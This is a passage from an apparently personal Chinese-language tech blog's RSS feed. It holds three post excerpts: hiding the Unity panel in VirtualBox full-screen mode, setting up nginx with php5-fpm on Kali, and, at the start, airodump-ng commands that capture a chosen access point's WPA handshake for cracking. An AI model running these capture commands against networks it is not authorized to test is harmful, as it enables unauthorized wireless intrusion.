$ sudo airodump-ng mon0
  然后选择特定的MAC地址进行测试：
$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one 上面这条命令的运行结果是这样的：</description>
    </item>
    
    <item>
      <title>hide unity panle when use virtualbox full screen model</title>
      <link>https://wrfly.kfd.me/posts/hide-unity-panle-when-use-virtualbox-full-screen-model/</link>
      <pubDate>Thu, 01 Jan 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/hide-unity-panle-when-use-virtualbox-full-screen-model/</guid>
      <description>Question:
Answer: &amp;gt; Disabling mini-toolbar in VMs settings is a temporary work-around. In the VirtualBox manager go to Settings-&amp;gt;General-&amp;gt;Advanced tab -&amp;gt; Mini ToolBar [] Show in Fullscreen/Seamless and make sure it is unchecked.
在Ubuntu 下运行 VirtualBox ，开一个虚拟机，全屏模式，Unity的panle会一直显示。
取消显示只需在虚拟机的设置里把“全屏模式下显示小工具栏”取消就可以了。
在虚拟机的&amp;ndash;设置&amp;ndash;常规&amp;ndash;高级&amp;ndash;小工具栏。
![setting/img/hide-unity-panle-in-virtualbox/setting.png)
取消之前是这样的
![before/img/hide-unity-panle-in-virtualbox/before.png)
取消之后是这样的
![after/img/hide-unity-panle-in-virtualbox/after.png)
原文链接</description>
    </item>
    
    <item>
      <title>kali nginx php</title>
      <link>https://wrfly.kfd.me/posts/kali-nginx-php/</link>
      <pubDate>Thu, 01 Jan 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/kali-nginx-php/</guid>
      <description>今天在Kali下配置了Nginx，但是php一直开不起来，妈蛋，搞了好久好久，原来是 php5-frm 没有重启。坑死了。
先安装php-fpm
apt-get install php5-fpm 然后修改nginx的配置文件:
vim /etc/nginx/sites-available/default 里面php-fpm的默认配置是注释掉的 
pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ .php$ {
fastcgi_split_path_info ^(.+.php)(/.+)$; # NOTE: You should have &amp;ldquo;cgi.fix_pathinfo = 0;&amp;rdquo; in php.ini #
# With php5-cgi alone: fastcgi_pass 127.0.0.1:9000; # With php5-fpm: fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; include fastcgi_params; #}  改成
location ~ \.php$ { fastcgi_split_path_info ^(.+\.php)(/.+)$; # # NOTE: You should have &amp;#34;cgi.</description>
    </item>
    
  </channel>
</rss>